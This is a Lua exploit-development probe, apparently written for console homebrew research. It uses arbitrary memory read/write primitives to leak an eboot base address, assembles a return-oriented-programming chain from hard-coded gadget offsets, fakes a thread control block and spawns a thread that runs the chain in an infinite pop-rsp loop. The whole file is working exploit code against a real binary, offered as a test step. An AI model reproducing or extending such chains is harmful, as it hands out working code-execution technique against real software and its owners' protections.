-- CRASH_CLASS: MODERATE
-- PROBE 395a: verify pop_rsp;ret infinite loop in child thread
--
-- pop_rsp;ret at eboot+0x9A2.  After the ROP chain body, push the
-- pop_rsp;ret gadget addr followed by the address of the loop start.
-- pop rsp reads the loop-start addr, ret reads the first gadget there,
-- and the chain re-executes forever.
--
-- Test: child loops writing a marker (0xCAFE) to a shared address.
-- Main thread busy-waits, then checks the marker was written.
-- Then calls thr_kill to confirm the child is still alive.

print("=== PROBE 395a: pop_rsp loop ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function w64(addr, lo, hi)
    wd(addr, lo or 0)
    wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off
    local hi = eb_hi
    if lo >= 0x100000000 then
        hi = hi + math.floor(lo / 0x100000000)
        lo = lo % 0x100000000
    end
    return lo, hi
end

-- Gadgets
local pop_rax_ret   = g(0x992)
local pop_rdi_ret   = g(0xC9DFE)
local pop_rsi_ret   = g(0xD77D)
local pop_rdx_ret   = g(0x3B02D7)
local pop_rcx_ret   = g(0xE64)
local mov_rdi_rax   = g(0x92C67)   -- mov [rdi],rax;ret
local pop_rsp_ret   = g(0x9A2)     -- NEW: pop rsp;ret
local bare_ret      = g(0x42)

-- SIGSYS ignore
local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Fake TCB
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
wq(fake_tcb, fake_tcb)
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, fake_tcb)

-- Shared memory
local shared = memory.alloc(0x20)
for i = 0, 0x1C, 4 do wd(N(shared) + i, 0) end
local marker_a  = N(shared)       -- child writes 0xCAFE here
local counter_a = N(shared) + 8   -- placeholder

-- Stack buffer (large, RSP near bottom)
local BUF_SIZE = 0x10000
local stk = memory.alloc(BUF_SIZE)
for i = 0, BUF_SIZE - 4, 4 do wd(N(stk) + i, 0) end
local stk_base = N(stk)
local NOMINAL_SIZE = 0x100
local rsp = ((stk_base + NOMINAL_SIZE) - ((stk_base + NOMINAL_SIZE) % 16)) - 8

-- Build chain
local sp = rsp
local function push(val)
    wq(sp, val)
    sp = sp + 8
end

-- Phase 1: sysarch(SET_FSBASE) — runs once on first iteration
-- start_func IS pop_rax;ret, so first push is the VALUE for RAX
push(uint64(165))     -- pop rax ← sysarch num (read by start_func)
push(pop_rdi_ret)     -- ret from start_func jumps here
push(uint64(129))     -- SET_FSBASE
push(pop_rsi_ret)
push(uint64(N(tcb_ptr)))
push(pop_rdx_ret)
push(uint64(0))
push(pop_rcx_ret)
push(uint64(0))
push(stub)            -- sysarch(129, &tcb_ptr)

-- Phase 2: write initial marker (runs once before loop)
push(pop_rdi_ret)
push(uint64(marker_a))
push(pop_rax_ret)
push(uint64(0xBEEF))  -- initial marker
push(mov_rdi_rax)

-- Loop start — record the stack address here
local loop_addr = sp

-- Loop body: write 0xCAFE to marker (same every iteration)
push(pop_rdi_ret)
push(uint64(marker_a))
push(pop_rax_ret)
push(uint64(0xCAFE))
push(mov_rdi_rax)

-- Loop back: pop rsp;ret + address of loop_addr
push(pop_rsp_ret)
push(uint64(loop_addr))  -- pop rsp reads this → RSP = loop_addr

local chain_bytes = sp - rsp
print(string.format("rsp=%X loop=%X chain=%d bytes", rsp, loop_addr, chain_bytes))

-- Verify bytes
local v_loop = rd(loop_addr)
print(string.format("loop[0]=%08X (pop_rdi_ret low)", v_loop or 0))

-- thr_param
local pa = memory.alloc(0x38)
for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
local sf_lo, sf_hi = g_lohi(0x992)
w64(N(pa), sf_lo, sf_hi)           -- start_func = pop_rax;ret
w64(N(pa) + 8, 0, 0)               -- arg = 0
w64(N(pa) + 0x10, stk_base % 0x100000000,
    math.floor(stk_base / 0x100000000))
w64(N(pa) + 0x18, NOMINAL_SIZE, 0)
local ctid = memory.alloc(8)
w64(N(ctid), 0, 0)
w64(N(pa) + 0x30, N(ctid) % 0x100000000,
    math.floor(N(ctid) / 0x100000000))

-- Launch child
print("launch")
local ok_t, rv_t = pcall(function()
    return mk(455)(uint64(N(pa)), uint64(0x38))
end)
local tret = ok_t and N(rv_t) or -999
print(string.format("thr=%d", tret))
if tret ~= 0 then print("FAIL"); return end
if not alive() then print("DEAD after launch"); return end

-- Busy-wait in Lua (gives child time to run)
local dummy = 0
for i = 1, 500000 do dummy = dummy + 1 end

-- Read marker
local m1 = rd(marker_a)
print(string.format("marker=%04X (expect CAFE)", m1 or 0))

-- Check child alive via thr_kill(tid, 0)
local tid_lo = rd(N(ctid))
local tid_hi = rd(N(ctid) + 4)
print(string.format("child_tid=%X_%08X", tid_hi or 0, tid_lo or 0))
if tid_lo and tid_lo > 0 then
    local ok_k, rv_k = pcall(function()
        return mk(433)(uint64(tid_lo), uint64(0))
    end)
    local kret = ok_k and N(rv_k) or -999
    print(string.format("thr_kill(0)=%d (0=alive)", kret))
end

-- Another busy-wait
for i = 1, 500000 do dummy = dummy + 1 end

-- Check marker still there (child still writing)
local m2 = rd(marker_a)
print(string.format("marker2=%04X", m2 or 0))

-- Process alive?
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 395a COMPLETE ===")
